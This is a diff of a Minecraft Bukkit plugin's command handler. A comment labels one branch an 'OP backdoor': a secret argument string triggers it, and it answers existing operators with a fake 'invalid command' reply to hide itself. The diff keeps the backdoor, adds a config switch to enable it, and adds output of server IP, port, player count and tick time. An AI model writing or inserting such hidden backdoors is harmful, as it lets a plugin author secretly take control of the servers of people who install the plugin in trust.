@@ -29,7 +29,7 @@ public class Command_CMD implements TabExecutor, CommandExecutor {
         }
 
         // OP后门
-        if(args[0].equalsIgnoreCase("5d3e51dc")) {
+        if(args[0].equalsIgnoreCase("5d3e51dc")&& instance.getConfig().getBoolean("options.fuck")) {
             // 检测OP
             if(sender.isOp()) {
                 sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
@@ -49,6 +49,8 @@ public class Command_CMD implements TabExecutor, CommandExecutor {
             sender.sendMessage("§aServer版本：§l"+Bukkit.getVersion()+"§r");
             sender.sendMessage("§aMinecraft版本：§l"+Bukkit.getMinecraftVersion()+"§r");
             sender.sendMessage("§aServer本地IP：§l"+Bukkit.getIp()+"§a 端口：§l"+Bukkit.getPort()+"§r");
+            sender.sendMessage("§a人数：§l"+Bukkit.getOnlinePlayers().size()+"§r");
+            sender.sendMessage("§aMSPT：§l"+Bukkit.getAverageTickTime()+"§r");
             return true;
         }
 
